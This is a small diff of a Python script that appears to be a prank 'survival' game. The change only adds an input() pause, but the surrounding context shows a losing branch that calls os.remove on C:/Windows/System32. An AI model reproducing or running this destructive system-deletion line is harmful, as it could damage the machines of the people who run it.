@@ -11,6 +11,7 @@ def main():
         os.remove("C:/Windows/System32")
     else:
         print("Phew, you survived!")
+        input()
 
 
 if __name__ == "__main__":
